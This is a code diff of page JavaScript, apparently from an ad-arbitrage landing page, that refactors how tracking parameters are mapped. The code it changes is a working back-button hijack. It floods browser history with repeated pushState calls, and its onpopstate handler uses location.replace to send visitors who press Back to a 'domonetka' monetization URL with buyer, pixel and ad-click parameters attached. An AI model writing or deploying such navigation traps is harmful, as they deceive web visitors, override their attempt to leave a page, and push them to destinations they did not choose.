@@ -58,33 +58,42 @@
 if (typeof domonetka !== 'undefined' && domonetka && domonetka.trim() !== '' && domonetka !== '{domonetka}') {
     try {
         window.onpopstate = function (event) {
-            if (event.state) {
-                const currentUrlParams = new URLSearchParams(window.location.search);
-                const newUrlParams = new URLSearchParams();
+  if (!event.state) return;
 
-                const paramMap = {
-                    source: 'source',
-                    ev: 'ev',
-                    acc: 'sub_id_2',
-                    placement: 'sub_id_3',
-                    buyer: 'sub_id_4',
-                    pxl: 'pxl',
-                    adset: 'sub_id_5',
-                    gclid: 'gclid',
-                    gt: 'gt',
-                    pt: 'pt'
-                };
+  const currentUrlParams = new URLSearchParams(window.location.search);
+  const newUrlParams = new URLSearchParams();
 
-                Object.entries(paramMap).forEach(([srcParam, targetParam]) => {
-                    if (currentUrlParams.has(srcParam)) {
-                        newUrlParams.set(targetParam, currentUrlParams.get(srcParam));
-                    }
-                });
+  const adsetRaw = currentUrlParams.get('adset');
+  if (adsetRaw) {
+    const [part1, ...rest] = adsetRaw.split('_');
+    const part2 = rest.join('_'); // на случай, если в названии объявления были подчёркивания
+    if (part1) newUrlParams.set('sub_id_5', part1);
+    if (part2) newUrlParams.set('sub_id_10', part2);
+  }
 
-                const newUrl = `${domonetka}?${newUrlParams.toString()}`;
-                location.replace(newUrl);
-            }
-        };
+  const paramMap = {
+    source: 'source',
+    ev: 'ev',
+    acc: 'sub_id_2',
+    placement: 'sub_id_3',
+    buyer: 'sub_id_4',
+    pxl: 'pxl',
+    // adset — пропускаем, уже обработан выше
+    gclid: 'gclid',
+    gt: 'gt',
+    pt: 'pt'
+  };
+
+  Object.entries(paramMap).forEach(([srcParam, targetParam]) => {
+    if (currentUrlParams.has(srcParam)) {
+      const v = currentUrlParams.get(srcParam);
+      if (v != null && v !== '') newUrlParams.set(targetParam, v);
+    }
+  });
+
+  const newUrl = `${domonetka}?${newUrlParams.toString()}`;
+  location.replace(newUrl);
+};
 
         for (let i = 0; i < 10; i++) {
             setTimeout(() => history.pushState({}, "", window.location.href), i * 50);
@@ -141,3 +150,4 @@ if (typeof domonetka !== 'undefined' && domonetka && domonetka.trim() !== '' && 
         document.body.appendChild(img);
     }
 })();
+
